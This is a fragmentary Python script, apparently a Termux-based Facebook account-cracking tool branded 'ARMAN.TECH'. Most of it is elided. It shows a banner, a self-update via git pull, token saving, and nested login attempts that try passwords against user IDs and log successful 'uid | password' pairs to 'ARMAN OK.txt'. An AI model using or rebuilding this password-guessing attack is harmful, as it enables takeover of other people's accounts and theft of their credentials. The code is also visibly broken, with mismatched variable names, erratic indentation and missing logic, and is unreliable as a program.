...
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/Blueforce_Arman/.empty/node_modules/bytes/index.js"):
...
\033[1;97m                                
        ...
        : ##.              :##:          
\033[1;97m--------------------------------------------------
\033[1;93m(!)\033[1;97m Author   : ARMAN.TECH
\033[1;93m(!)\033[1;97m Github   :  Arman.BALOCH
\033[1;93m(!)\033[1;97m Fb Page  : PAGE NOT FOUND
...
def user_info():
    ...
    time.sleep(1)
    try:
        abm = open("/sdcard/.arman.txt", "r").read()
...
def login_fb():
    ...
    q = json.loads(data)
    if "loc" in q:
        login_arman = open('access_token.txt', 'w')
        login_arman.write(q["loc"])
        login_abm.close()
	print("")
						...
						if "www.facebook.com" in q["error"]:
							...
							if "loc" in q:
								...
								if "www.facebook.com" in q["error"]:
									...
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;92m[ARMAN OK] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("ARMAN OK.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
